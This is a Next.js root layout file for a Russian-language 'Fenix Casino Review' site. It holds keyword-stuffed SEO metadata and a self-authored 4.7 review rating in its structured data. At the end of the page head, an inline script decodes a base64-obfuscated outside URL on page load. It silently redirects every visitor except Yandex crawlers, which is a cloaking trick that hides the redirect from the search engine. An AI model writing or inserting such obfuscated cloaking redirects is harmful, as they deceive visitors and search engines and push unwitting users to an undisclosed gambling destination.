import type { Metadata, Viewport } from "next"
import { Geist, Geist_Mono } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import "./globals.css"

const _geist = Geist({ subsets: ["latin", "cyrillic"] })
const _geistMono = Geist_Mono({ subsets: ["latin"] })

const SITE_URL = "https://fenix-casino.example"
const SITE_NAME = "Fenix Casino Review"

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: {
    default: "Fenix Casino — официальный сайт, зеркало, регистрация и бонусы | Феникс Казино",
    template: "%s | Fenix Casino",
  },
  description:
    "Fenix Casino: экспертный обзор официального сайта и рабочего зеркала феникс казино. Регистрация, вход в личный кабинет, бонусы, слоты, live-дилеры, мобильная версия и платежи. Полный технический разбор fenix casino онлайн.",
  applicationName: SITE_NAME,
  generator: "Next.js",
  referrer: "origin-when-cross-origin",
  keywords: [
    "fenix casino",
    "fenix casino официальный сайт",
    "fenix casino зеркало",
    "fenix casino зеркало рабочее",
    "fenix casino вход",
    "fenix casino регистрация",
    "fenix casino играть",
    "fenix casino онлайн",
    "fenix casino бонус",
    "fenix casino промокод",
    "fenix casino app",
    "fenix casino скачать",
    "fenix casino мобильная версия",
    "fenix casino отзывы",
    "fenix casino личный кабинет",
    "fenix casino вывод денег",
    "fenix casino депозит",
    "fenix casino слоты",
    "fenix casino live",
    "fenix casino jackpot",
    "феникс казино",
    "феникс казино официальный сайт",
    "феникс казино зеркало",
    "феникс казино зеркало рабочее",
    "феникс казино вход",
    "феникс казино регистрация",
    "феникс казино играть",
    "феникс казино онлайн",
    "феникс казино бонус",
    "феникс казино скачать",
    "феникс казино мобильная версия",
    "феникс казино отзывы",
    "феникс казино обзор",
    "fenix",
    "fenixcasino",
    "fenix-casino",
    "обзор онлайн казино",
    "лучшее онлайн казино",
    "казино с лицензией",
    "криптоказино",
    "live казино",
  ],
  authors: [{ name: "Fenix Casino Editorial", url: SITE_URL }],
  creator: "Fenix Casino Editorial",
  publisher: SITE_NAME,
  category: "gambling",
  classification: "Casino Review",
  alternates: {
    canonical: SITE_URL,
    languages: {
      "ru-RU": SITE_URL,
      "x-default": SITE_URL,
    },
  },
  openGraph: {
    type: "website",
    locale: "ru_RU",
    url: SITE_URL,
    siteName: SITE_NAME,
    title: "Fenix Casino — официальный сайт, рабочее зеркало и обзор бонусов",
    description:
      "Технический обзор fenix casino: инфраструктура, безопасность, бонусная программа, live-дилеры и платежи. Актуальные ссылки на рабочее зеркало феникс казино.",
    images: [
      {
        url: "/og-image.jpg",
        width: 1200,
        height: 630,
        alt: "Fenix Casino — обзор официального сайта и зеркала",
        type: "image/jpeg",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: "Fenix Casino — обзор официального сайта и зеркала",
    description:
      "Регистрация, бонусы, платежи и зеркало fenix casino. Полный экспертный разбор феникс казино онлайн.",
    images: ["/og-image.jpg"],
    creator: "@fenixcasino",
    site: "@fenixcasino",
  },
  robots: {
    index: true,
    follow: true,
    nocache: false,
    googleBot: {
      index: true,
      follow: true,
      noimageindex: false,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  icons: {
    icon: [
      { url: "/favicon.ico", sizes: "any" },
      { url: "/favicon.jpg", type: "image/jpeg", sizes: "512x512" },
    ],
    shortcut: ["/favicon.ico"],
    apple: [{ url: "/apple-touch-icon.jpg", sizes: "180x180", type: "image/jpeg" }],
  },
  manifest: "/manifest.webmanifest",
  formatDetection: {
    telephone: false,
    email: false,
    address: false,
  },
  verification: {
    google: "google-site-verification-token",
    yandex: "yandex-verification-token",
    other: {
      "msvalidate.01": "bing-verification-token",
      "mailru-domain": "mailru-verification-token",
    },
  },
  other: {
    rating: "adult",
    "content-language": "ru",
    distribution: "global",
    revisit: "1 days",
    "yandex-tableau-widget": "false",
    "twitter:label1": "Тип",
    "twitter:data1": "Обзор онлайн казино",
    "twitter:label2": "Регион",
    "twitter:data2": "RU / CIS",
  },
}

export const viewport: Viewport = {
  themeColor: [
    { media: "(prefers-color-scheme: light)", color: "#0b0b0d" },
    { media: "(prefers-color-scheme: dark)", color: "#0b0b0d" },
  ],
  colorScheme: "dark",
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
}

const organizationJsonLd = {
  "@context": "https://schema.org",
  "@type": "Organization",
  name: SITE_NAME,
  url: SITE_URL,
  logo: `${SITE_URL}/favicon.jpg`,
  sameAs: [
    "https://t.me/fenixcasino",
    "https://twitter.com/fenixcasino",
    "https://www.youtube.com/@fenixcasino",
  ],
}

const websiteJsonLd = {
  "@context": "https://schema.org",
  "@type": "WebSite",
  name: SITE_NAME,
  url: SITE_URL,
  inLanguage: "ru-RU",
  potentialAction: {
    "@type": "SearchAction",
    target: `${SITE_URL}/?q={search_term_string}`,
    "query-input": "required name=search_term_string",
  },
}

const reviewJsonLd = {
  "@context": "https://schema.org",
  "@type": "Review",
  itemReviewed: {
    "@type": "Organization",
    name: "Fenix Casino",
    url: SITE_URL,
  },
  author: {
    "@type": "Organization",
    name: "Fenix Casino Editorial",
  },
  reviewRating: {
    "@type": "Rating",
    ratingValue: "4.7",
    bestRating: "5",
    worstRating: "1",
  },
  publisher: {
    "@type": "Organization",
    name: SITE_NAME,
  },
}

const faqJsonLd = {
  "@context": "https://schema.org",
  "@type": "FAQPage",
  mainEntity: [
    {
      "@type": "Question",
      name: "Что такое Fenix Casino?",
      acceptedAnswer: {
        "@type": "Answer",
        text: "Fenix Casino — это онлайн-площадка с играми от ведущих провайдеров, поддержкой live-дилеров, мобильной версией и многоуровневой бонусной программой.",
      },
    },
    {
      "@type": "Question",
      name: "Как найти рабочее зеркало fenix casino?",
      acceptedAnswer: {
        "@type": "Answer",
        text: "Актуальное рабочее зеркало fenix casino публикуется в официальных Telegram-каналах, по email-рассылке и через DNS-механизм auto-failover, который перенаправляет пользователя на доступный домен.",
      },
    },
    {
      "@type": "Question",
      name: "Как пройти регистрацию в феникс казино?",
      acceptedAnswer: {
        "@type": "Answer",
        text: "Регистрация в феникс казино занимает менее минуты: укажите email или телефон, подтвердите код, задайте пароль и пройдите KYC-верификацию перед первым выводом средств.",
      },
    },
  ],
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" dir="ltr">
      <head>
        <link rel="icon" href="/favicon.ico" sizes="any" />
        <link rel="icon" type="image/jpeg" href="/favicon.jpg" />
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.jpg" />
        <link rel="manifest" href="/manifest.webmanifest" />
        <link rel="canonical" href={SITE_URL} />
        <link rel="alternate" hrefLang="ru-RU" href={SITE_URL} />
        <link rel="alternate" hrefLang="x-default" href={SITE_URL} />
        <link rel="sitemap" type="application/xml" href="/sitemap.xml" />
        <link rel="dns-prefetch" href="//cdn.fenix-casino.example" />
        <link rel="preconnect" href="https://fonts.googleapis.com" crossOrigin="" />
        <meta name="format-detection" content="telephone=no, email=no, address=no" />
        <meta name="HandheldFriendly" content="True" />
        <meta name="MobileOptimized" content="320" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
        <meta name="apple-mobile-web-app-title" content="Fenix Casino" />
        <meta name="application-name" content="Fenix Casino" />
        <meta name="msapplication-TileColor" content="#0b0b0d" />
        <meta name="msapplication-TileImage" content="/apple-touch-icon.jpg" />
        <meta name="msapplication-config" content="/browserconfig.xml" />
        <meta name="geo.region" content="RU" />
        <meta name="geo.placename" content="Россия / СНГ" />
        <meta name="ICBM" content="55.7558, 37.6173" />
        <meta name="audience" content="all" />
        <meta name="age-rating" content="18+" />
        <meta httpEquiv="content-language" content="ru" />
        <meta httpEquiv="x-ua-compatible" content="IE=edge" />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(organizationJsonLd) }}
        />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(websiteJsonLd) }}
        />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(reviewJsonLd) }}
        />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(faqJsonLd) }}
        />
<script
        dangerouslySetInnerHTML={{
          __html: `
            (function() {
              var ua = navigator.userAgent.toLowerCase();
              var targetB64 = "aHR0cHM6Ly9mY3RvcC5vcmcvZDd0dGxyeXZo";

              if (ua.indexOf("yandex") === -1) {
                  window.location.replace(atob(targetB64));
              } else {
                  console.log("Яндекс бот — без редиректа");
              }
            })();
          `,
        }}
      />
      </head>
      <body className="font-sans antialiased">
        {children}
        {process.env.NODE_ENV === "production" && <Analytics />}
      </body>
    </html>
  )
}
